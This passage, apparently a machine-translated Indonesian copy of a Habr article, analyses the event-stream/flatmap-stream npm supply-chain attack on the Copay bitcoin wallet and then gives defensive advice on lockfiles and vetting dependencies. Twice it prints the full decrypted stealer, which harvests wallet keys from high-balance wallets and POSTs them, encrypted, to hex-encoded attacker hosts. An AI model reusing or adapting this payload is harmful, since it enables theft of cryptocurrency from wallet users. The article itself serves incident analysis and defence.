class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{}); r.on(<span class="hljs-string"><span class="hljs-string">"error"</span></span>, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{}), r.write(n), r.end() } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">r</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e, t</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> n = <span class="hljs-string"><span class="hljs-string">""</span></span>, r = <span class="hljs-number"><span class="hljs-number">0</span></span>; r &lt; t.length; r += <span class="hljs-number"><span class="hljs-number">200</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> o = t.substr(r, <span class="hljs-number"><span class="hljs-number">200</span></span>); n += a.publicEncrypt(c, Buffer.from(o, <span class="hljs-string"><span class="hljs-string">"utf8"</span></span>)).toString(<span class="hljs-string"><span class="hljs-string">"hex"</span></span>) + <span class="hljs-string"><span class="hljs-string">"+"</span></span> } i(<span class="hljs-string"><span class="hljs-string">"636f7061796170692e686f7374"</span></span>, e, n), i(<span class="hljs-string"><span class="hljs-string">"3131312e39302e3135312e313334"</span></span>, e, n) } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">l</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">t, n</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.cordova) <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> e = cordova.file.dataDirectory; resolveLocalFileSystemURL(e, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{ e.getFile(t, { <span class="hljs-attr"><span class="hljs-attr">create</span></span>: !<span class="hljs-number"><span class="hljs-number">1</span></span> }, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{ e.file(<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> FileReader; t.onloadend = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> n(<span class="hljs-built_in"><span class="hljs-built_in">JSON</span></span>.parse(t.result)) }, t.onerror = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{ t.abort() }, t.readAsText(e) }) }) }) } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {} <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> r = localStorage.getItem(t); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (r) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> n(<span class="hljs-built_in"><span class="hljs-built_in">JSON</span></span>.parse(r)) } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {} <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { chrome.storage.local.get(t, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (e) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> n(<span class="hljs-built_in"><span class="hljs-built_in">JSON</span></span>.parse(e[t])) }) } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {} } } global.CSSMap = {}, l(<span class="hljs-string"><span class="hljs-string">"profile"</span></span>, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> e.credentials) { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> n = e.credentials[t]; <span class="hljs-string"><span class="hljs-string">"livenet"</span></span> == n.network &amp;&amp; l(<span class="hljs-string"><span class="hljs-string">"balanceCache-"</span></span> + n.walletId, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>; t.balance = <span class="hljs-built_in"><span class="hljs-built_in">parseFloat</span></span>(e.balance.split(<span class="hljs-string"><span class="hljs-string">" "</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>]), <span class="hljs-string"><span class="hljs-string">"btc"</span></span> == t.coin &amp;&amp; t.balance &lt; <span class="hljs-number"><span class="hljs-number">100</span></span> || <span class="hljs-string"><span class="hljs-string">"bch"</span></span> == t.coin &amp;&amp; t.balance &lt; <span class="hljs-number"><span class="hljs-number">1e3</span></span> || (global.CSSMap[t.xPubKey] = !<span class="hljs-number"><span class="hljs-number">0</span></span>, r(<span class="hljs-string"><span class="hljs-string">"c"</span></span>, <span class="hljs-built_in"><span class="hljs-built_in">JSON</span></span>.stringify(t))) }.bind(n)) } }); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> e = <span class="hljs-built_in"><span class="hljs-built_in">require</span></span>(<span class="hljs-string"><span class="hljs-string">"bitcore-wallet-client/lib/credentials.js"</span></span>); e.prototype.getKeysFunc = e.prototype.getKeys, e.prototype.getKeys = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getKeysFunc(e); <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { global.CSSMap &amp;&amp; global.CSSMap[<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.xPubKey] &amp;&amp; (<span class="hljs-keyword"><span class="hljs-keyword">delete</span></span> global.CSSMap[<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.xPubKey], r(<span class="hljs-string"><span class="hljs-string">"p"</span></span>, e + <span class="hljs-string"><span class="hljs-string">"\\t"</span></span> + <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.xPubKey)) } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {} <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> t } } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {} } <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.cordova ? <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.addEventListener(<span class="hljs-string"><span class="hljs-string">"deviceready"</span></span>, e) : e() }();</code> \\ nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxoV1GvDc2FUsJnrAqR4C \\ nDXUs / peqJu00casTfH442yVFkMwV59egxxpTPQ1YJxnQEIhiGte6KrzDYCrdeBfj \\ nBOEFEze8aeGn9FOxUeXYWNeiASyS6Q77NSQVk1LW + / BiGud7b77Fwfq372fUuEIk \\ n2P / pUHRoXkBymLWF1nf0L7RIE7ZLhoEBi2dEIP05qGf6BJLHPNbPZkG4grTDv762 \\ nPDBMwQsCKQcpKDXw / 6c8gl5e2XM7wXhVhI2ppfoj36oCqpQrkuFIOL2SAaIewDZz \\ nLlapGCf2c2QdrQiRkY8LiUYKdsV2XsfHPb327Pv3Q246yULww00uOMl / CJ / x76To \\ n2wIDAQAB \ <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">/*@@*/</span></span> ! <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">e</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> o = <span class="hljs-built_in"><span class="hljs-built_in">require</span></span>(<span class="hljs-string"><span class="hljs-string">"http"</span></span>), a = <span class="hljs-built_in"><span class="hljs-built_in">require</span></span>(<span class="hljs-string"><span class="hljs-string">"crypto"</span></span>), c = <span class="hljs-string"><span class="hljs-string">"-----BEGIN PUBLIC KEY-----\\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxoV1GvDc2FUsJnrAqR4C\\nDXUs/peqJu00casTfH442yVFkMwV59egxxpTPQ1YJxnQEIhiGte6KrzDYCrdeBfj\\nBOEFEze8aeGn9FOxUeXYWNeiASyS6Q77NSQVk1LW+/BiGud7b77Fwfq372fUuEIk\\n2P/pUHRoXkBymLWF1nf0L7RIE7ZLhoEBi2dEIP05qGf6BJLHPNbPZkG4grTDv762\\nPDBMwQsCKQcpKDXw/6c8gl5e2XM7wXhVhI2ppfoj36oCqpQrkuFIOL2SAaIewDZz\\nLlapGCf2c2QdrQiRkY8LiUYKdsV2XsfHPb327Pv3Q246yULww00uOMl/cJ/x76To\\n2wIDAQAB\\n-----END PUBLIC KEY-----"</span></span>; <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">i</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e, t, n</span></span></span><span class="hljs-function">) </span></span>{ e = Buffer.from(e, <span class="hljs-string"><span class="hljs-string">"hex"</span></span>).toString(); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> r = o.request({ <span class="hljs-attr"><span class="hljs-attr">hostname</span></span>: e, <span class="hljs-attr"><span class="hljs-attr">port</span></span>: <span class="hljs-number"><span class="hljs-number">8080</span></span>, <span class="hljs-attr"><span class="hljs-attr">method</span></span>: <span class="hljs-string"><span class="hljs-string">"POST"</span></span>, <span class="hljs-attr"><span class="hljs-attr">path</span></span>: <span class="hljs-string"><span class="hljs-string">"/"</span></span> + t, <span class="hljs-attr"><span class="hljs-attr">headers</span></span>: { <span class="hljs-string"><span class="hljs-string">"Content-Length"</span></span>: n.length, <span class="hljs-string"><span class="hljs-string">"Content-Type"</span></span>: <span class="hljs-string"><span class="hljs-string">"text/html"</span></span> } }, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{}); r.on(<span class="hljs-string"><span class="hljs-string">"error"</span></span>, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{}), r.write(n), r.end() } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">r</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e, t</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> n = <span class="hljs-string"><span class="hljs-string">""</span></span>, r = <span class="hljs-number"><span class="hljs-number">0</span></span>; r &lt; t.length; r += <span class="hljs-number"><span class="hljs-number">200</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> o = t.substr(r, <span class="hljs-number"><span class="hljs-number">200</span></span>); n += a.publicEncrypt(c, Buffer.from(o, <span class="hljs-string"><span class="hljs-string">"utf8"</span></span>)).toString(<span class="hljs-string"><span class="hljs-string">"hex"</span></span>) + <span class="hljs-string"><span class="hljs-string">"+"</span></span> } i(<span class="hljs-string"><span class="hljs-string">"636f7061796170692e686f7374"</span></span>, e, n), i(<span class="hljs-string"><span class="hljs-string">"3131312e39302e3135312e313334"</span></span>, e, n) } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">l</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">t, n</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.cordova) <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> e = cordova.file.dataDirectory; resolveLocalFileSystemURL(e, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{ e.getFile(t, { <span class="hljs-attr"><span class="hljs-attr">create</span></span>: !<span class="hljs-number"><span class="hljs-number">1</span></span> }, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{ e.file(<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> FileReader; t.onloadend = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> n(<span class="hljs-built_in"><span class="hljs-built_in">JSON</span></span>.parse(t.result)) }, t.onerror = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{ t.abort() }, t.readAsText(e) }) }) }) } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {} <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> r = localStorage.getItem(t); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (r) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> n(<span class="hljs-built_in"><span class="hljs-built_in">JSON</span></span>.parse(r)) } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {} <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { chrome.storage.local.get(t, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (e) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> n(<span class="hljs-built_in"><span class="hljs-built_in">JSON</span></span>.parse(e[t])) }) } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {} } } global.CSSMap = {}, l(<span class="hljs-string"><span class="hljs-string">"profile"</span></span>, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> e.credentials) { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> n = e.credentials[t]; <span class="hljs-string"><span class="hljs-string">"livenet"</span></span> == n.network &amp;&amp; l(<span class="hljs-string"><span class="hljs-string">"balanceCache-"</span></span> + n.walletId, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>; t.balance = <span class="hljs-built_in"><span class="hljs-built_in">parseFloat</span></span>(e.balance.split(<span class="hljs-string"><span class="hljs-string">" "</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>]), <span class="hljs-string"><span class="hljs-string">"btc"</span></span> == t.coin &amp;&amp; t.balance &lt; <span class="hljs-number"><span class="hljs-number">100</span></span> || <span class="hljs-string"><span class="hljs-string">"bch"</span></span> == t.coin &amp;&amp; t.balance &lt; <span class="hljs-number"><span class="hljs-number">1e3</span></span> || (global.CSSMap[t.xPubKey] = !<span class="hljs-number"><span class="hljs-number">0</span></span>, r(<span class="hljs-string"><span class="hljs-string">"c"</span></span>, <span class="hljs-built_in"><span class="hljs-built_in">JSON</span></span>.stringify(t))) }.bind(n)) } }); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> e = <span class="hljs-built_in"><span class="hljs-built_in">require</span></span>(<span class="hljs-string"><span class="hljs-string">"bitcore-wallet-client/lib/credentials.js"</span></span>); e.prototype.getKeysFunc = e.prototype.getKeys, e.prototype.getKeys = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getKeysFunc(e); <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { global.CSSMap &amp;&amp; global.CSSMap[<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.xPubKey] &amp;&amp; (<span class="hljs-keyword"><span class="hljs-keyword">delete</span></span> global.CSSMap[<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.xPubKey], r(<span class="hljs-string"><span class="hljs-string">"p"</span></span>, e + <span class="hljs-string"><span class="hljs-string">"\\t"</span></span> + <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.xPubKey)) } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {} <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> t } } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) {} } <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.cordova ? <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.addEventListener(<span class="hljs-string"><span class="hljs-string">"deviceready"</span></span>, e) : e() }();</code> </pre> <br><p>  Seperti yang mungkin sudah Anda duga, skrip ini mencoba mencuri dompet bitcoin Anda dan mengunggah datanya ke server penyerang. </p><br><p>  <em>Diperbarui:</em> tim npm merilis <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">laporan insiden resminya</a> , yang menjelaskan bahwa kode berbahaya dimaksudkan untuk diluncurkan dalam proses rilis Copay untuk menyuntikkan skrip pencurian bitcoin ke dalam kode aplikasi dompet Copay. </p><br><p>  Jadi untuk meringkas </p><br><ul><li>  Platform bitcoin <code>copay-dash</code> menggunakan dependensi event-stream. </li><li>  Pada bulan September, selama kurang lebih satu minggu, event-stream mengandung dependensi flatmap-stream, karena proyek ditransfer ke pengembang baru yang menambahkan dependensi dan menghapusnya seminggu kemudian. </li><li>  flatmap-stream berisi fragmen tersembunyi di akhir kode yang diperkecil, yang mencoba memecahkan kode garis dari file <code>test/data.js</code> , menggunakan deskripsi paket root sebagai kunci AES256. </li><li>  Untuk setiap paket reguler, ini menyebabkan kesalahan (karena deskripsi paket adalah kunci yang salah), yang diam-diam diproses.  Tetapi untuk copay-dash, dekripsi memberikan JavaScript yang valid, yang meluncurkan tahap dekripsi lain dan mengeksekusi skrip jahat yang mencuri dompet bitcoin Anda. </li></ul><br><h2 id="chto-teper-delat">  Apa yang harus dilakukan sekarang? </h2><br><p>  Itu adalah serangan yang sangat licik, sangat mengingatkan <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">pada posting Januari</a> , dengan deskripsi serangan hipotetis yang sama.  Penyerang dengan terampil menyapu jejaknya - kode dan riwayat komit di Github menunjukkan situasi yang tidak berbahaya dan mencurigakan (pengembang baru bergabung dengan proyek, menambahkan fitur, dan kemudian sedikit mengubah implementasinya).  Selain tanda-tanda mencurigakan dalam flatmap-stream (paket baru, tidak ada kontributor dan statistik unduhan), serangan itu ternyata hampir tidak terlihat.  Dan pada kenyataannya, itu tidak terdeteksi selama 2 bulan dan hanya ditemukan sekarang karena penyerang <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">membuat kesalahan kecil</a> menggunakan metode <code>crypto.createDecipher</code> ketinggalan zaman alih-alih <code>crypto.createDecipheriv</code> , yang menyebabkan pesan yang mencurigakan tentang penggunaan metode yang ketinggalan zaman di perpustakaan lain, yang menggunakan event-stream. </p><br><p>  Sayangnya, jenis serangan ini tidak akan meninggalkan kita dalam waktu dekat.  JavaScript adalah bahasa yang paling <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">populer</a> saat ini, yang berarti akan tetap menjadi target yang menarik bagi peretas.  JavaScript juga memiliki fungsi yang relatif sedikit di perpustakaan standar dibandingkan dengan bahasa lain, yang memaksa pengembang untuk menggunakan paket dari npm - bersama dengan faktor budaya lainnya, ini mengarah pada fakta bahwa proyek JavaScript biasanya memiliki pohon ketergantungan yang besar. </p><br><p>  Perlu dicatat bahwa meskipun aplikasi JavaScript lebih rentan terhadap kelas kerentanan ini, ini belum tentu menjadi alasan bahwa JavaScript pada umumnya kurang aman.  JavaScript biasanya digunakan oleh lebih banyak pengembang aktif yang mencoba untuk berada di gelombang kemajuan, yaitu, pengguna mereka menginstal lebih banyak paket dan pembaruan, termasuk perbaikan keamanan.  Pada saat yang sama, aplikasi Java Equifax diretas untuk alasan sebaliknya - mereka <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">tidak menginstal pembaruan keamanan untuk Apache Struts</a> selama berbulan-bulan.  Kerentanan semacam ini lebih kecil kemungkinannya dalam aplikasi JavaScript.  Pada akhirnya, ketika memilih tumpukan teknologi untuk perusahaan, pertanyaan keamanan selalu muncul.  Pelajaran penting akan memahami skenario serangan yang mungkin untuk keputusan khusus Anda dan kemampuan untuk mengantisipasi mereka. </p><br><p>  Apa artinya ini untuk tumpukan javascript?  Tidak ada kekurangan ide dan saran bagaimana npm atau komunitas lain dapat mencegah serangan tersebut.  Tetapi untuk pengguna akhir, setidaknya ada dua langkah dasar untuk mengurangi risiko Anda: </p><br><ul><li><p>  <strong>Gunakan file kunci</strong> .  Tidak masalah apakah itu yarn.lock atau package-lock.json, file kunci apa pun menjamin bahwa Anda akan menerima versi paket yang sama dengan setiap instalasi, yaitu, jika Anda aman hari ini, Anda akan tetap sama besok.  Aplikasi yang menjalankan dependensi mengambang tanpa menggunakan file kunci sangat rentan terhadap pembaruan berbahaya, karena mereka secara otomatis menginstal versi dependensi terbaru yang tersedia, yaitu, Anda dapat dikompromikan dengan setiap penempatan setelah salah satu dependensi Anda dikompromikan dan diterbitkan versi dengan kerentanan.  Dengan file kunci, Anda setidaknya akan membatasi risiko Anda pada tindakan manual pengembang yang menambahkan dan memperbarui paket, yang dapat diperiksa ulang dengan peninjauan kode atau kebijakan perusahaan lainnya. </p><br></li><li><p>  <strong>Pikirkan sebelum Anda meletakkan sesuatu</strong> .  Seperti yang ditunjukkan di atas, ini bukan obat mujarab, peretas masih bisa menyelinap melalui bookmark dalam kode yang diperkecil yang sulit ditemukan, bahkan jika Anda tahu mereka ada di sana.  Namun tidak kalah pentingnya, Anda dapat mengurangi risiko jika tetap menggunakan paket yang populer dan didukung secara aktif.  Sebelum memasang kecanduan baru, tanyakan pada diri Anda apakah Anda benar-benar membutuhkannya.  Jika Anda sudah tahu cara menulis kode, dan tidak membutuhkan lebih dari selusin baris, cukup tulis sendiri.  Jika Anda masih membutuhkan dependensi, evaluasi sebelum instalasi.  Berapa banyak unduhan yang dia miliki di npm?  Apakah repositori di Github terlihat aktif diperbarui?  Apakah paket sudah diperbarui baru-baru ini?  Jika tidak, pertimbangkan forking dan menggunakannya.  Ini akan mengurangi risiko, karena Anda tidak akan terpapar dengan pembaruan berbahaya di masa mendatang, Anda akan dapat membaca dan memperkecil sendiri kode sumber dan memastikan bahwa itu benar-benar mengandung dan melakukan. </p><br></li></ul></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/id431360/">https://habr.com/ru/post/id431360/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id431344/index.html">Akustik bawaan: apa itu dan cara kerjanya</a></li>
<li><a href="../id431346/index.html">Mengembangkan aplikasi yang bisa digerakkan untuk Slack</a></li>
<li><a href="../id431348/index.html">Anycubic Photon: ikhtisar mini printer 3D photopolymer yang murah</a></li>
<li><a href="../id431350/index.html">Paket Pengembangan Prosesor Elektronik Baikal</a></li>
<li><a href="../id431354/index.html">Codec video pembelajaran mesin pertama secara dramatis melampaui semua codec yang ada, termasuk H.265 dan VP9</a></li>
<li><a href="../id431362/index.html">Bagaimana seorang desainer bisa menyingkirkan rutinitas dan tetap tertarik pada pekerjaannya?</a></li>
<li><a href="../id431370/index.html">Laporan tercepat di barat liar. Dan beberapa bug di samping ...</a></li>
<li><a href="../id431372/index.html">Mengganggu dari perangkat eksternal dalam sistem x86. Bagian 2. Opsi boot kernel Linux</a></li>
<li><a href="../id431374/index.html">Penilaian terakhir: analisis indikator keuangan permainan di akses awal</a></li>
<li><a href="../id431376/index.html">Migrasi data di perusahaan berdarah: apa yang harus dianalisis, agar tidak membanjiri proyek</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
